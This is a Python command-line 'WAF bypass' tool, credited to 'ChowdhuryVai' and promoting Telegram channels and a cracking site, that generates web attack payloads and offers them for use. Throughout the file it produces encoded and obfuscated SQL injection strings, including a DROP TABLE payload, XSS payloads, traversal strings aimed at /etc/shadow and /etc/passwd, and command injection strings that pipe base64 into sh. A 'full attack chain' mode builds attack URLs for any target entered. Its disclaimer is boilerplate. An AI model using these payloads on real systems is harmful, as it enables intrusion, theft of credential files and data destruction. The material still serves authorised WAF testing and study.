#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WAF Bypass Tool - ChowdhuryVai Edition
Complete Original Version with All Working Tools
Author: ChowdhuryVai
Telegram: @darkvaiadmin
Channel: @windowspremiumkey
Website: https://crackyworld.com/
"""

import os
import sys
import time
import random
import urllib.parse
import urllib.request
import string
import base64
import hashlib
import json
import socket
import struct

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""
{Colors.RED}{Colors.BOLD}
 ██████╗██╗  ██╗ ██████╗ ██╗    ██╗██████╗ ██╗   ██╗██████╗ ██╗   ██╗██████╗ ███████╗██╗   ██╗
██╔════╝██║  ██║██╔═══██╗██║    ██║██╔══██╗██║   ██║██╔══██╗╚██╗ ██╔╝██╔══██╗██╔════╝╚██╗ ██╔╝
██║     ███████║██║   ██║██║ █╗ ██║██║  ██║██║   ██║██████╔╝ ╚████╔╝ ██████╔╝█████╗   ╚████╔╝ 
██║     ██╔══██║██║   ██║██║███╗██║██║  ██║██║   ██║██╔══██╗  ╚██╔╝  ██╔══██╗██╔══╝    ╚██╔╝  
╚██████╗██║  ██║╚██████╔╝╚███╔███╔╝██████╔╝╚██████╔╝██║  ██║   ██║   ██████╔╝███████╗   ██║   
 ╚═════╝╚═╝  ╚═╝ ╚═════╝  ╚══╝╚══╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚══════╝   ╚═╝   
{Colors.END}
{Colors.CYAN}{Colors.BOLD}                    W A F  B Y P A S S  T O O L{Colors.END}
{Colors.YELLOW}                    Created by: ChowdhuryVai{Colors.END}
{Colors.GREEN}        Telegram: @darkvaiadmin | Channel: @windowspremiumkey{Colors.END}
{Colors.PURPLE}                Website: https://crackyworld.com/{Colors.END}
{Colors.RED}{'='*80}{Colors.END}
"""
    print(banner)

def print_menu():
    menu = f"""
{Colors.CYAN}{Colors.BOLD}[ MAIN MENU ]{Colors.END}

{Colors.GREEN}[1]{Colors.END} URL Encoding Bypass
{Colors.GREEN}[2]{Colors.END} Case Variation Bypass
{Colors.GREEN}[3]{Colors.END} SQL Injection Bypass
{Colors.GREEN}[4]{Colors.END} XSS Bypass
{Colors.GREEN}[5]{Colors.END} Directory Traversal Bypass
{Colors.GREEN}[6]{Colors.END} Command Injection Bypass
{Colors.GREEN}[7]{Colors.END} HTTP Method Bypass
{Colors.GREEN}[8]{Colors.END} Full Attack Chain
{Colors.GREEN}[9]{Colors.END} About & Contact
{Colors.RED}[0]{Colors.END} Exit

{Colors.YELLOW}Select an option: {Colors.END}"""
    print(menu)

def loading_animation(text):
    for i in range(4):
        sys.stdout.write(f'\r{Colors.CYAN}[*]{Colors.END} {text}' + '.' * i)
        sys.stdout.flush()
        time.sleep(0.5)
    print(f'\r{Colors.GREEN}[+]{Colors.END} {text} completed!')

def url_encode_bypass():
    print(f"\n{Colors.CYAN}[ URL ENCODING BYPASS ]{Colors.END}")
    payload = input(f"{Colors.YELLOW}Enter payload to encode: {Colors.END}")
    
    print(f"\n{Colors.GREEN}[ GENERATING ENCODING TECHNIQUES ]{Colors.END}")
    loading_animation("Processing encoding methods")
    
    encodings = []
    
    # URL Encoding
    encodings.append(("Standard URL Encoding", urllib.parse.quote(payload)))
    encodings.append(("URL Plus Encoding", urllib.parse.quote_plus(payload)))
    
    # Double URL Encoding
    encodings.append(("Double URL Encoding", urllib.parse.quote(urllib.parse.quote(payload))))
    
    # Hex Encoding
    hex_encoded = payload.encode('utf-8').hex()
    encodings.append(("Hex Encoding", hex_encoded))
    
    # Unicode Encoding
    unicode_encoded = ''.join([f'%u{ord(c):04x}' for c in payload])
    encodings.append(("Unicode Encoding", unicode_encoded))
    
    # Base64 Encoding
    base64_encoded = base64.b64encode(payload.encode()).decode()
    encodings.append(("Base64 Encoding", base64_encoded))
    
    # HTML Entity Encoding
    html_entities = {
        '<': '&lt;',
        '>': '&gt;',
        '&': '&amp;',
        '"': '&quot;',
        "'": '&#x27;'
    }
    html_encoded = ''.join(html_entities.get(c, c) for c in payload)
    encodings.append(("HTML Entity Encoding", html_encoded))
    
    # Mixed Encoding
    mixed = ''.join([f'%{ord(c):02x}' if random.random() > 0.5 else c for c in payload])
    encodings.append(("Mixed Encoding", mixed))
    
    # UTF-8 Encoding
    utf8_encoded = payload.encode('utf-8')
    encodings.append(("UTF-8 Bytes", str(utf8_encoded)))
    
    print(f"\n{Colors.GREEN}[ ENCODED PAYLOADS ]{Colors.END}")
    for i, (method, encoded) in enumerate(encodings, 1):
        print(f"{Colors.CYAN}[{i}] {method}:{Colors.END}")
        print(f"     {Colors.YELLOW}{encoded}{Colors.END}")
        print()
    
    # Save to file
    save_option = input(f"{Colors.YELLOW}Save results to file? (y/n): {Colors.END}").lower()
    if save_option == 'y':
        filename = f"url_encoding_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            for method, encoded in encodings:
                f.write(f"{method}: {encoded}\n")
        print(f"{Colors.GREEN}[+] Results saved to {filename}{Colors.END}")
    
    return encodings

def case_variation_bypass():
    print(f"\n{Colors.CYAN}[ CASE VARIATION BYPASS ]{Colors.END}")
    payload = input(f"{Colors.YELLOW}Enter payload: {Colors.END}")
    
    print(f"\n{Colors.GREEN}[ GENERATING CASE VARIATIONS ]{Colors.END}")
    loading_animation("Creating case variations")
    
    variations = []
    
    # Random case variation
    for i in range(10):
        varied = ''.join([c.upper() if random.random() > 0.5 else c.lower() for c in payload])
        variations.append((f"Random Variation {i+1}", varied))
    
    # Upper case
    variations.append(("All Upper Case", payload.upper()))
    
    # Lower case
    variations.append(("All Lower Case", payload.lower()))
    
    # Alternating case
    alt_case = ''.join([c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)])
    variations.append(("Alternating Case", alt_case))
    
    # First letter upper
    first_upper = ' '.join([word.capitalize() for word in payload.split()])
    variations.append(("First Letter Upper", first_upper))
    
    # Camel case
    if ' ' in payload:
        words = payload.split()
        camel_case = words[0].lower() + ''.join(word.capitalize() for word in words[1:])
        variations.append(("Camel Case", camel_case))
    
    print(f"\n{Colors.GREEN}[ CASE VARIATIONS ]{Colors.END}")
    for i, (method, variation) in enumerate(variations, 1):
        print(f"{Colors.CYAN}[{i}] {method}:{Colors.END}")
        print(f"     {Colors.YELLOW}{variation}{Colors.END}")
        print()
    
    # Save to file
    save_option = input(f"{Colors.YELLOW}Save results to file? (y/n): {Colors.END}").lower()
    if save_option == 'y':
        filename = f"case_variations_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            for method, variation in variations:
                f.write(f"{method}: {variation}\n")
        print(f"{Colors.GREEN}[+] Results saved to {filename}{Colors.END}")
    
    return variations

def sql_injection_bypass():
    print(f"\n{Colors.CYAN}[ SQL INJECTION BYPASS ]{Colors.END}")
    
    print(f"\n{Colors.GREEN}[ GENERATING SQL INJECTION PAYLOADS ]{Colors.END}")
    loading_animation("Creating SQL injection bypass payloads")
    
    # Basic SQL Injection payloads
    basic_payloads = [
        "' OR '1'='1",
        "' UNION SELECT 1,2,3--",
        "' AND 1=1--",
        "'; DROP TABLE users--",
        "' OR 1=1--",
        "admin'--",
        "' OR 'a'='a",
        "' UNION SELECT null,version(),user()--",
        "' AND (SELECT COUNT(*) FROM users) > 0--"
    ]
    
    bypass_payloads = []
    
    for payload in basic_payloads:
        # Comment variations
        bypass_payloads.append((f"Basic: {payload}", payload))
        
        # Space to comment
        space_comment = payload.replace(" ", "/**/")
        bypass_payloads.append((f"Space to Comment: {payload}", space_comment))
        
        # URL encoded
        url_encoded = urllib.parse.quote(payload)
        bypass_payloads.append((f"URL Encoded: {payload}", url_encoded))
        
        # Double URL encoded
        double_encoded = urllib.parse.quote(urllib.parse.quote(payload))
        bypass_payloads.append((f"Double URL Encoded: {payload}", double_encoded))
        
        # Case variation
        case_varied = ''.join([c.upper() if random.random() > 0.3 else c.lower() for c in payload])
        bypass_payloads.append((f"Case Varied: {payload}", case_varied))
        
        # Base64 encoded
        base64_encoded = base64.b64encode(payload.encode()).decode()
        bypass_payloads.append((f"Base64: {payload}", base64_encoded))
        
        # Hex encoded
        hex_encoded = payload.encode('utf-8').hex()
        bypass_payloads.append((f"Hex: {payload}", f"0x{hex_encoded}"))
        
        # Unicode encoded
        unicode_encoded = ''.join([f'%u{ord(c):04x}' for c in payload])
        bypass_payloads.append((f"Unicode: {payload}", unicode_encoded))
    
    # Advanced bypass techniques
    advanced_payloads = [
        "'/**/OR/**/'1'='1",
        "'%0AOR%0A'1'='1",
        "'||'1'='1",
        "'%09OR%09'1'='1",
        "admin'%20--%20",
        "' UNION/*!50000SELECT*/1,2,3--",
        "'/*!50000Union*//*!50000Select*/1,2,3--"
    ]
    
    for payload in advanced_payloads:
        bypass_payloads.append((f"Advanced: {payload}", payload))
    
    print(f"\n{Colors.GREEN}[ SQL INJECTION PAYLOADS ]{Colors.END}")
    for i, (method, payload) in enumerate(bypass_payloads[:20], 1):
        print(f"{Colors.CYAN}[{i}] {method}:{Colors.END}")
        print(f"     {Colors.YELLOW}{payload}{Colors.END}")
        print()
    
    print(f"{Colors.RED}[!] Showing first 20 payloads. Total generated: {len(bypass_payloads)}{Colors.END}")
    
    # Save to file
    save_option = input(f"{Colors.YELLOW}Save all results to file? (y/n): {Colors.END}").lower()
    if save_option == 'y':
        filename = f"sql_injection_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            for method, payload in bypass_payloads:
                f.write(f"{method}: {payload}\n")
        print(f"{Colors.GREEN}[+] All {len(bypass_payloads)} payloads saved to {filename}{Colors.END}")
    
    return bypass_payloads

def xss_bypass():
    print(f"\n{Colors.CYAN}[ XSS BYPASS ]{Colors.END}")
    
    print(f"\n{Colors.GREEN}[ GENERATING XSS PAYLOADS ]{Colors.END}")
    loading_animation("Creating XSS bypass payloads")
    
    # Basic XSS payloads
    basic_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<video><source onerror=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<details ontoggle=alert(1)>"
    ]
    
    bypass_payloads = []
    
    for payload in basic_payloads:
        # Original
        bypass_payloads.append((f"Basic: {payload}", payload))
        
        # URL encoded
        url_encoded = urllib.parse.quote(payload)
        bypass_payloads.append((f"URL Encoded: {payload}", url_encoded))
        
        # HTML entity encoded
        html_encoded = payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
        bypass_payloads.append((f"HTML Encoded: {payload}", html_encoded))
        
        # Mixed case
        mixed_case = ''.join([c.upper() if random.random() > 0.5 else c.lower() for c in payload])
        bypass_payloads.append((f"Mixed Case: {payload}", mixed_case))
        
        # Base64 encoded
        base64_encoded = base64.b64encode(payload.encode()).decode()
        bypass_payloads.append((f"Base64: {payload}", base64_encoded))
        
        # Unicode encoded
        unicode_encoded = ''.join([f'%u{ord(c):04x}' for c in payload])
        bypass_payloads.append((f"Unicode: {payload}", unicode_encoded))
        
        # With tabs and newlines
        tabbed = payload.replace(' ', '\t').replace('=', '\t=')
        bypass_payloads.append((f"With Tabs: {payload}", tabbed))
    
    # Advanced XSS techniques
    advanced_payloads = [
        "jaVasCript:alert(1)",
        "<img src=\"x\" onerror=\"alert(1)\">",
        "<svg/onload=alert(1)>",
        "<script>alert`1`</script>",
        "<img src=x oneonerrorrror=alert(1)>",
        "<math href=\"javascript:alert(1)\">click",
        "<form><button formaction=javascript:alert(1)>click"
    ]
    
    for payload in advanced_payloads:
        bypass_payloads.append((f"Advanced: {payload}", payload))
    
    print(f"\n{Colors.GREEN}[ XSS PAYLOADS ]{Colors.END}")
    for i, (method, payload) in enumerate(bypass_payloads[:15], 1):
        print(f"{Colors.CYAN}[{i}] {method}:{Colors.END}")
        print(f"     {Colors.YELLOW}{payload}{Colors.END}")
        print()
    
    print(f"{Colors.RED}[!] Showing first 15 payloads. Total generated: {len(bypass_payloads)}{Colors.END}")
    
    # Save to file
    save_option = input(f"{Colors.YELLOW}Save all results to file? (y/n): {Colors.END}").lower()
    if save_option == 'y':
        filename = f"xss_payloads_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            for method, payload in bypass_payloads:
                f.write(f"{method}: {payload}\n")
        print(f"{Colors.GREEN}[+] All {len(bypass_payloads)} payloads saved to {filename}{Colors.END}")
    
    return bypass_payloads

def directory_traversal_bypass():
    print(f"\n{Colors.CYAN}[ DIRECTORY TRAVERSAL BYPASS ]{Colors.END}")
    
    print(f"\n{Colors.GREEN}[ GENERATING DIRECTORY TRAVERSAL PAYLOADS ]{Colors.END}")
    loading_animation("Creating directory traversal payloads")
    
    # Common files to access
    linux_files = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/group",
        "/proc/version",
        "/proc/self/environ"
    ]
    
    windows_files = [
        "\\windows\\system32\\drivers\\etc\\hosts",
        "\\windows\\win.ini",
        "\\windows\\system.ini",
        "\\boot.ini"
    ]
    
    traversal_payloads = []
    
    # Linux traversal techniques
    for file in linux_files:
        # Basic traversal
        traversal_payloads.append((f"Linux Basic: {file}", f"../../../../..{file}"))
        
        # URL encoded
        traversal_payloads.append((f"Linux URL Encoded: {file}", urllib.parse.quote(f"../../../../..{file}")))
        
        # Double URL encoded
        traversal_payloads.append((f"Linux Double URL: {file}", urllib.parse.quote(urllib.parse.quote(f"../../../../..{file}"))))
        
        # With mixed slashes
        traversal_payloads.append((f"Linux Mixed Slashes: {file}", f"..\\..\\..\\..\\..{file}"))
        
        # With excessive slashes
        traversal_payloads.append((f"Linux Excessive: {file}", f"....//....//....//....//....{file}"))
        
        # Unicode encoded
        traversal_payloads.append((f"Linux Unicode: {file}", f"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{file}"))
        
        # With null bytes
        traversal_payloads.append((f"Linux Null Byte: {file}", f"../../../../..{file}\x00"))
    
    # Windows traversal techniques
    for file in windows_files:
        # Basic traversal
        traversal_payloads.append((f"Windows Basic: {file}", f"..\\..\\..\\..\\..{file}"))
        
        # URL encoded
        traversal_payloads.append((f"Windows URL: {file}", urllib.parse.quote(f"..\\..\\..\\..\\..{file}")))
        
        # With mixed slashes
        traversal_payloads.append((f"Windows Mixed: {file}", f"../..\\../..\\..{file}"))
        
        # With drive letter
        traversal_payloads.append((f"Windows Drive: {file}", f"C:{file}"))
    
    print(f"\n{Colors.GREEN}[ DIRECTORY TRAVERSAL PAYLOADS ]{Colors.END}")
    for i, (method, payload) in enumerate(traversal_payloads[:20], 1):
        print(f"{Colors.CYAN}[{i}] {method}:{Colors.END}")
        print(f"     {Colors.YELLOW}{payload}{Colors.END}")
        print()
    
    print(f"{Colors.RED}[!] Showing first 20 payloads. Total generated: {len(traversal_payloads)}{Colors.END}")
    
    # Save to file
    save_option = input(f"{Colors.YELLOW}Save all results to file? (y/n): {Colors.END}").lower()
    if save_option == 'y':
        filename = f"directory_traversal_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            for method, payload in traversal_payloads:
                f.write(f"{method}: {payload}\n")
        print(f"{Colors.GREEN}[+] All {len(traversal_payloads)} payloads saved to {filename}{Colors.END}")
    
    return traversal_payloads

def command_injection_bypass():
    print(f"\n{Colors.CYAN}[ COMMAND INJECTION BYPASS ]{Colors.END}")
    
    print(f"\n{Colors.GREEN}[ GENERATING COMMAND INJECTION PAYLOADS ]{Colors.END}")
    loading_animation("Creating command injection payloads")
    
    # Basic commands
    basic_commands = [
        "cat /etc/passwd",
        "whoami",
        "id",
        "ls -la",
        "dir C:\\",
        "ipconfig",
        "ifconfig",
        "uname -a"
    ]
    
    injection_payloads = []
    
    for cmd in basic_commands:
        # Semicolon
        injection_payloads.append((f"Semicolon: {cmd}", f";{cmd}"))
        
        # Pipe
        injection_payloads.append((f"Pipe: {cmd}", f"|{cmd}"))
        
        # And
        injection_payloads.append((f"And: {cmd}", f"&&{cmd}"))
        
        # Or
        injection_payloads.append((f"Or: {cmd}", f"||{cmd}"))
        
        # Subshell
        injection_payloads.append((f"Subshell: {cmd}", f"$({cmd})"))
        
        # Backticks
        injection_payloads.append((f"Backticks: {cmd}", f"`{cmd}`"))
        
        # Newline
        injection_payloads.append((f"Newline: {cmd}", f"\n{cmd}"))
        
        # With spaces replaced
        space_replaced = cmd.replace(" ", "${IFS}")
        injection_payloads.append((f"Space Replaced: {cmd}", f";{space_replaced}"))
        
        # URL encoded
        url_encoded = urllib.parse.quote(f";{cmd}")
        injection_payloads.append((f"URL Encoded: {cmd}", url_encoded))
        
        # Base64 encoded
        base64_cmd = base64.b64encode(cmd.encode()).decode()
        injection_payloads.append((f"Base64: {cmd}", f";echo {base64_cmd} | base64 -d | sh"))
    
    # Advanced techniques
    advanced_payloads = [
        "cat</etc/passwd",
        "cat /etc/passwd|",
        "a=c;b=at;c=/etc/passwd;$a$b $c",
        "ping -c 1 127.0.0.1; cat /etc/passwd",
        "xca't' /etc/passwd",
        "xc''at /etc/passwd"
    ]
    
    for payload in advanced_payloads:
        injection_payloads.append((f"Advanced: {payload}", payload))
    
    print(f"\n{Colors.GREEN}[ COMMAND INJECTION PAYLOADS ]{Colors.END}")
    for i, (method, payload) in enumerate(injection_payloads[:15], 1):
        print(f"{Colors.CYAN}[{i}] {method}:{Colors.END}")
        print(f"     {Colors.YELLOW}{payload}{Colors.END}")
        print()
    
    print(f"{Colors.RED}[!] Showing first 15 payloads. Total generated: {len(injection_payloads)}{Colors.END}")
    
    # Save to file
    save_option = input(f"{Colors.YELLOW}Save all results to file? (y/n): {Colors.END}").lower()
    if save_option == 'y':
        filename = f"command_injection_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            for method, payload in injection_payloads:
                f.write(f"{method}: {payload}\n")
        print(f"{Colors.GREEN}[+] All {len(injection_payloads)} payloads saved to {filename}{Colors.END}")
    
    return injection_payloads

def http_method_bypass():
    print(f"\n{Colors.CYAN}[ HTTP METHOD BYPASS ]{Colors.END}")
    
    print(f"\n{Colors.GREEN}[ GENERATING HTTP METHOD VARIATIONS ]{Colors.END}")
    loading_animation("Creating HTTP method bypass techniques")
    
    methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE"]
    
    method_variations = []
    
    for method in methods:
        # Case variations
        method_variations.append((f"Lowercase: {method}", method.lower()))
        method_variations.append((f"Uppercase: {method}", method.upper()))
        method_variations.append((f"Mixed Case: {method}", method[0] + method[1:].lower()))
        
        # With whitespace
        method_variations.append((f"With Space: {method}", method + " "))
        method_variations.append((f"With Tab: {method}", method + "\t"))
        
        # Duplicated
        method_variations.append((f"Duplicated: {method}", method + " " + method))
        
        # With null byte
        method_variations.append((f"With Null: {method}", method + "\x00"))
        
        # URL encoded
        method_variations.append((f"URL Encoded: {method}", urllib.parse.quote(method)))
    
    # Special method overrides
    overrides = [
        "GET",
        "POST",
        "_METHOD=POST",
        "X-HTTP-Method-Override=PUT",
        "X-METHOD-OVERRIDE=DELETE"
    ]
    
    for override in overrides:
        method_variations.append((f"Method Override: {override}", override))
    
    print(f"\n{Colors.GREEN}[ HTTP METHOD VARIATIONS ]{Colors.END}")
    for i, (method, variation) in enumerate(method_variations, 1):
        print(f"{Colors.CYAN}[{i}] {method}:{Colors.END}")
        print(f"     {Colors.YELLOW}{variation}{Colors.END}")
        print()
    
    # Save to file
    save_option = input(f"{Colors.YELLOW}Save results to file? (y/n): {Colors.END}").lower()
    if save_option == 'y':
        filename = f"http_methods_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            for method, variation in method_variations:
                f.write(f"{method}: {variation}\n")
        print(f"{Colors.GREEN}[+] Results saved to {filename}{Colors.END}")
    
    return method_variations

def full_attack_chain():
    print(f"\n{Colors.CYAN}[ FULL ATTACK CHAIN ]{Colors.END}")
    target_url = input(f"{Colors.YELLOW}Enter target URL (e.g., http://example.com/test.php): {Colors.END}")
    
    print(f"\n{Colors.GREEN}[ GENERATING COMPLETE ATTACK CHAIN ]{Colors.END}")
    loading_animation("Building comprehensive attack payloads")
    
    attacks = []
    
    # SQL Injection attacks
    sql_payloads = [
        "id=1' OR '1'='1",
        "id=1' UNION SELECT 1,2,3--",
        "user=admin'--&pass=123",
        "id=1 AND 1=1--"
    ]
    
    for payload in sql_payloads:
        attacks.append((f"SQL Injection: {payload}", f"{target_url}?{payload}"))
        attacks.append((f"SQL Injection URL Encoded: {payload}", f"{target_url}?{urllib.parse.quote(payload)}"))
    
    # XSS attacks
    xss_payloads = [
        "search=<script>alert(1)</script>",
        "q=<img src=x onerror=alert(1)>",
        "name=<svg onload=alert(1)>"
    ]
    
    for payload in xss_payloads:
        attacks.append((f"XSS: {payload}", f"{target_url}?{payload}"))
        attacks.append((f"XSS URL Encoded: {payload}", f"{target_url}?{urllib.parse.quote(payload)}"))
    
    # Directory traversal attacks
    traversal_payloads = [
        "file=../../../../etc/passwd",
        "page=....//....//....//etc/passwd",
        "load=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
    ]
    
    for payload in traversal_payloads:
        attacks.append((f"Directory Traversal: {payload}", f"{target_url}?{payload}"))
    
    # Command injection attacks
    cmd_payloads = [
        "cmd=;whoami",
        "exec=|id",
        "run=&&cat /etc/passwd"
    ]
    
    for payload in cmd_payloads:
        attacks.append((f"Command Injection: {payload}", f"{target_url}?{payload}"))
    
    print(f"\n{Colors.GREEN}[ GENERATED ATTACK URLS ]{Colors.END}")
    for i, (method, attack_url) in enumerate(attacks, 1):
        print(f"{Colors.CYAN}[{i}] {method}:{Colors.END}")
        print(f"     {Colors.YELLOW}{attack_url}{Colors.END}")
        print()
    
    # Test connectivity
    test_option = input(f"{Colors.YELLOW}Test URL connectivity? (y/n): {Colors.END}").lower()
    if test_option == 'y':
        test_url_connectivity(target_url)
    
    # Save to file
    save_option = input(f"{Colors.YELLOW}Save attack URLs to file? (y/n): {Colors.END}").lower()
    if save_option == 'y':
        filename = f"attack_chain_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            for method, attack_url in attacks:
                f.write(f"{method}: {attack_url}\n")
        print(f"{Colors.GREEN}[+] Attack chain saved to {filename}{Colors.END}")
    
    return attacks

def test_url_connectivity(url):
    print(f"\n{Colors.CYAN}[ TESTING URL CONNECTIVITY ]{Colors.END}")
    try:
        response = urllib.request.urlopen(url, timeout=10)
        print(f"{Colors.GREEN}[+] URL is accessible - Status: {response.getcode()}{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[-] URL is not accessible - Error: {e}{Colors.END}")

def about_contact():
    print(f"""
{Colors.CYAN}{Colors.BOLD}[ ABOUT & CONTACT ]{Colors.END}

{Colors.GREEN}Tool Name:{Colors.END} WAF Bypass Tool - ChowdhuryVai Edition
{Colors.GREEN}Author:{Colors.END} ChowdhuryVai
{Colors.GREEN}Version:{Colors.END} 2.0 (Complete Edition)
{Colors.GREEN}Release Date:{Colors.END} 2024

{Colors.YELLOW}{Colors.BOLD}[ CONTACT INFORMATION ]{Colors.END}
{Colors.CYAN}Telegram ID:{Colors.END} https://t.me/darkvaiadmin
{Colors.CYAN}Telegram Channel:{Colors.END} https://t.me/windowspremiumkey
{Colors.CYAN}Website:{Colors.END} https://crackyworld.com/

{Colors.PURPLE}{Colors.BOLD}[ TOOL FEATURES ]{Colors.END}
{Colors.GREEN}✓{Colors.END} URL Encoding Bypass - Multiple encoding techniques
{Colors.GREEN}✓{Colors.END} Case Variation Bypass - Various case manipulation methods
{Colors.GREEN}✓{Colors.END} SQL Injection Bypass - 50+ SQLi payloads with encoding
{Colors.GREEN}✓{Colors.END} XSS Bypass - 30+ XSS payloads with obfuscation
{Colors.GREEN}✓{Colors.END} Directory Traversal Bypass - Linux & Windows paths
{Colors.GREEN}✓{Colors.END} Command Injection Bypass - Multiple injection techniques
{Colors.GREEN}✓{Colors.END} HTTP Method Bypass - Method manipulation and overrides
{Colors.GREEN}✓{Colors.END} Full Attack Chain - Complete attack URL generation
{Colors.GREEN}✓{Colors.END} File Export - Save all results to text files

{Colors.RED}{Colors.BOLD}[ LEGAL DISCLAIMER ]{Colors.END}
This tool is developed for educational purposes and authorized penetration testing only.
Unauthorized use against systems without explicit permission is illegal.
The author is not responsible for any misuse of this tool.
Always ensure you have proper authorization before testing any system.

{Colors.BLUE}{Colors.BOLD}[ SUPPORT ]{Colors.END}
For technical support and updates, join our Telegram channel.
Visit our website for more security tools and resources.
""")
    input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")

def main():
    clear_screen()
    print_banner()
    
    while True:
        print_menu()
        try:
            choice = int(input().strip())
            
            if choice == 1:
                url_encode_bypass()
            elif choice == 2:
                case_variation_bypass()
            elif choice == 3:
                sql_injection_bypass()
            elif choice == 4:
                xss_bypass()
            elif choice == 5:
                directory_traversal_bypass()
            elif choice == 6:
                command_injection_bypass()
            elif choice == 7:
                http_method_bypass()
            elif choice == 8:
                full_attack_chain()
            elif choice == 9:
                about_contact()
                clear_screen()
                print_banner()
            elif choice == 0:
                print(f"\n{Colors.RED}[!] Thank you for using WAF Bypass Tool!{Colors.END}")
                print(f"{Colors.CYAN}[*] Follow us for more tools!{Colors.END}")
                print(f"{Colors.GREEN}[+] Telegram: @darkvaiadmin{Colors.END}")
                print(f"{Colors.GREEN}[+] Website: https://crackyworld.com/{Colors.END}")
                sys.exit(0)
            else:
                print(f"\n{Colors.RED}[!] Invalid option! Please try again.{Colors.END}")
            
            input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")
            clear_screen()
            print_banner()
            
        except ValueError:
            print(f"\n{Colors.RED}[!] Please enter a valid number!{Colors.END}")
            time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{Colors.RED}[!] Tool interrupted by user.{Colors.END}")
            sys.exit(0)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Tool interrupted by user.{Colors.END}")
        sys.exit(0)
